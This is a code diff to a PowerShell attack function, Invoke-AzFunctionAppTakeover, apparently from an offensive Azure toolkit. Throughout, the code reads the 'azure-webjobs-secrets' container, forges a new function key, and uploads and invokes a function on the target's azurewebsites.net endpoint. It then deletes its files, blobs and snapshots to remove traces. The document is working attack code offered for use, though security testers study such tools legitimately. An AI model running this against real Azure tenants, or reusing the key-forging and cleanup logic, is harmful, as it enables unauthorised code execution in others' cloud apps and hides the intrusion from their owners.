@@ -202,8 +202,8 @@ function Invoke-AzFunctionAppTakeover{
                     $appType = "CustomHandler"
                 #>
 
-                # Start with ASP.NET as the base option, CustomHandler supports ASP.NET, so this will work as a fallback
-                $appType = "ASP.NET"            
+                # Start with UNDETERMINED as the base option
+                $appType = "UNDETERMINED"            
 
                 # Walk each share and look at files to determine app type
                 $fileShareList | ForEach-Object {
@@ -277,13 +277,39 @@ function Invoke-AzFunctionAppTakeover{
                         Get-AzStorageBlobContent -Container "azure-webjobs-secrets" -Blob $secretsFile.Name -Context $storageContext -Destination $TempFile -Verbose:$false -Force | Out-Null
                         $encryptedFunctionKeys = (gc $TempFile | ConvertFrom-Json)
 
+
+                        # Find a function JSON file (not host.json) to use as a template
+                        $TempJSONFileDown = New-TemporaryFile
+                        $functionTemplateFile = Get-AzStorageBlob -Context $storageContext -Name "azure-webjobs-secrets" | select Name | where Name -Match ".json" | where Name -Match $_.FunctionApp | where Name -NotMatch "host.json"
+                        Get-AzStorageBlobContent -Container "azure-webjobs-secrets" -Blob $functionTemplateFile[0].Name -Context $storageContext -Destination $TempJSONFileDown -Verbose:$false -Force | Out-Null
+
+                        # Generate new json secrets file for the function
+                        $newkey = @{
+                            name = "tempfunckey"
+                            value = (New-Guid).Guid
+                            encrypted = $false
+                        }
+                        $functionCode = $newkey.value
+                        
+                        # Create a new object from the template file
+                        $functionTemplate = (gc $TempJSONFileDown | ConvertFrom-Json)
+
+                        # Add the key to the object
+                        $functionTemplate.keys += $newkey
+                        $TempJSONFile = New-TemporaryFile
+                        $functionTemplate | ConvertTo-Json | Out-File $TempJSONFile
+
+                        # Create new File Share (site/wwwroot/$newFolder) folder
+                        $newFolder = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
+
+                        # Upload the keys file
+                        Set-AzStorageBlobContent -Container "azure-webjobs-secrets" -File $TempJSONFile -Blob (-join($currentApp,"/",$newFolder,".json").ToLower()) -Context $storageContext -Verbose:$false | Out-Null
+
+
                         # Determine container OS
                         $hostENVvar = ($encryptedFunctionKeys.decryptionKeyId).Split("=")[0]
                         if($hostENVvar -eq "MACHINEKEY_DecryptionKey"){$containerOS = "windows"}
                         else{$containerOS = "linux"}
-
-                        # Create new File Share (site/wwwroot/$newFolder) folder
-                        $newFolder = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
 
                         Write-Verbose "`t`t`t`t`tCreating the $($newFolder) folder in the $($fileShareList.Name) File Share in the $($storageContext.Name) Storage Account and uploading files"
 
@@ -311,7 +337,7 @@ function Invoke-AzFunctionAppTakeover{
                         # Make request to the new function and return the results
                         while ($httpResponseContent -eq $null){
                             try{
-                                $httpFullResponse = (Invoke-WebRequest -Uri "https://$currentApp.azurewebsites.net/api/$($newFolder)?name=$currentApp" -UseBasicParsing -Verbose:$false)
+                                $httpFullResponse = (Invoke-WebRequest -Uri "https://$currentApp.azurewebsites.net/api/$($newFolder)?name=$currentApp&code=$functionCode" -UseBasicParsing -Verbose:$false)
                                 if ($httpFullResponse.StatusCode -eq 200){
                                     $httpResponseContent = $httpFullResponse.Content | ConvertFrom-Json
                                 }
@@ -330,6 +356,8 @@ function Invoke-AzFunctionAppTakeover{
                         Write-Verbose "`t`t`t`t`tRemoving the files from the Storage Account"
                         # Remove temp files
                         Remove-Item $TempFile -Force | Out-Null
+                        Remove-Item $TempJSONFile -Force | Out-Null
+                        Remove-Item $TempJSONFileDown -Force | Out-Null                        
 
                         # Delete each of the added files and remove the folder from the Storage Account Share
                         try{Remove-AzStorageFile -Context $storageContext -ShareName $fileShareList.Name -Path site/wwwroot/$newFolder/function.json -Verbose:$false -ErrorAction Stop | Out-Null}catch{}
@@ -341,7 +369,12 @@ function Invoke-AzFunctionAppTakeover{
                         try{Remove-AzStorageDirectory -ShareName $fileShareList.Name -Context $storageContext -Path site/wwwroot/$newFolder -ErrorAction Stop}catch{}
 
                         # Delete generated funtion file from the Storage Account Container (azure-webjobs-secrets/$currentApp/$newFolder.json)
-                        try{Remove-AzStorageBlob -Container "azure-webjobs-secrets" -Blob (-join($currentApp,"/",$newFolder,".json")) | Out-Null}catch{}
+                        try{
+                            Remove-AzStorageBlob -Context $storageContext -Container "azure-webjobs-secrets" -Blob (-join($currentApp,"/",$newFolder,".json").ToLower()) -Verbose:$false | Out-Null
+                            $snapshotDelete = Get-AzStorageBlob -Context $storageContext -Name "azure-webjobs-secrets" | select Name | where Name -Match $newFolder.ToLower()
+                            Remove-AzStorageBlob -Context $storageContext -Container "azure-webjobs-secrets" -Blob $snapshotDelete.Name -Verbose:$false | Out-Null
+                            }
+                        catch{}
                     }
                     "PowerShell" {
 
@@ -422,7 +455,7 @@ function Invoke-AzFunctionAppTakeover{
                         try{Remove-AzStorageDirectory -ShareName $fileShareList.Name -Context $storageContext -Path site/wwwroot/$newFolder -ErrorAction Stop}catch{}
 
                         # Delete generated funtion file from the Storage Account Container (azure-webjobs-secrets/$currentApp/$newFolder.json)
-                        try{Remove-AzStorageBlob -Container "azure-webjobs-secrets" -Blob (-join($currentApp,"/",$newFolder,".json")) | Out-Null}catch{}
+                        try{Remove-AzStorageBlob -Context $storageContext -Container "azure-webjobs-secrets" -Blob (-join($currentApp,"/",$newFolder,".json")) | Out-Null}catch{}
 
                     }
                     "Node.js" {
@@ -504,7 +537,7 @@ function Invoke-AzFunctionAppTakeover{
                         try{Remove-AzStorageDirectory -ShareName $fileShareList.Name -Context $storageContext -Path site/wwwroot/$newFolder -ErrorAction Stop}catch{}
 
                         # Delete generated funtion file from the Storage Account Container (azure-webjobs-secrets/$currentApp/$newFolder.json)
-                        try{Remove-AzStorageBlob -Container "azure-webjobs-secrets" -Blob (-join($currentApp,"/",$newFolder,".json")) | Out-Null}catch{}
+                        try{Remove-AzStorageBlob -Context $storageContext -Container "azure-webjobs-secrets" -Blob (-join($currentApp,"/",$newFolder,".json")) | Out-Null}catch{}
 
                     }
                     "Python" {
@@ -581,12 +614,12 @@ function Invoke-AzFunctionAppTakeover{
                         #!!! - Add __pycache__ files to remove - __init__.cpython-310.pyc -  may have different name for different py version
 
                         # Delete generated funtion file from the Storage Account Container (azure-webjobs-secrets/$currentApp/$newFolder.json)
-                        try{Remove-AzStorageBlob -Container "azure-webjobs-secrets" -Blob (-join($currentApp,"/",$newFolder,".json")) | Out-Null}catch{}
+                        try{Remove-AzStorageBlob -Context $storageContext -Container "azure-webjobs-secrets" -Blob (-join($currentApp,"/",$newFolder,".json")) | Out-Null}catch{}
 
                     }
                     "CustomHandler" {
                     }
-                    "UNDETERMINED" {Write-Verbose "`t`t`tThe tool was unable to determine the function language, skipping the $($storageContext.Name) Storage Account"}
+                    "UNDETERMINED" {Write-Verbose "`t`t`tThe tool was unable to determine the function language, probably due to a lack of existing functions, skipping the $($storageContext.Name) Storage Account"}
                 }
                 Write-Verbose "`t`tCompleted attacking the $($currentApp) Function App in the $currentShare File Share"
             }
